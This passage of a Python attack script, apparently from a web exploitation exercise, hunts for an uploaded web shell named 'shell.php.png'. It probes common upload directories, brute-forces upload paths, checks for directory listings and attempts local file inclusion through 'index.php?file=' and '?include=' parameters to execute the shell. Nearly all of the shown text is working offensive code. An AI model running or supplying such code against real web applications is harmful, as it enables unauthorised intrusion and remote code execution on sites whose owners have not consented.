    f"{base_url}/gallery/",
    # Try to find shell.php.png in various locations
    f"{base_url}/upload/shell.php.png",
    f"{base_url}/uploads/shell.php.png",
    f"{base_url}/images/shell.php.png",
    f"{base_url}/files/shell.php.png",
    # Try without extension
    f"{base_url}/upload/shell",
    f"{base_url}/uploads/shell",
    # Check for LFI - see if we can include the uploaded file
    f"{base_url}/index.php?file=upload/shell.php.png",
    f"{base_url}/index.php?include=upload/shell.php.png"
]

print("\n3. Testing various locations and LFI...")
for url in test_urls:
    resp = requests.get(url)
    if resp.status_code != 404:
        print(f"[FOUND] {url}: {resp.status_code} ({len(resp.content)} bytes)")
        if len(resp.content) < 1000:
            print(f"  Content: {resp.text[:300]}")

# 4. Try to brute force common upload paths
print("\n4. Brute-forcing common upload paths...")
common_paths = ['uploads', 'upload', 'images', 'img', 'files', 'assets', 'media', 'gallery', 'pictures', 'photos', 'userfiles', 'userdata', 'images/user', 'upload/user']
for path in common_paths:
    test_url = f"{base_url}/{path}"
    resp = requests.get(test_url)
    if resp.status_code < 400:
        print(f"[DIRECTORY FOUND] {test_url}: {resp.status_code}")
        # Try to list files if possible
        if 'directory' in resp.text.lower() or 'index of' in resp.text.lower():
            print(f"  Possible directory listing: {resp.text[:500]}")

print("\n" + "=" * 60)
print("Upload testing complete.")
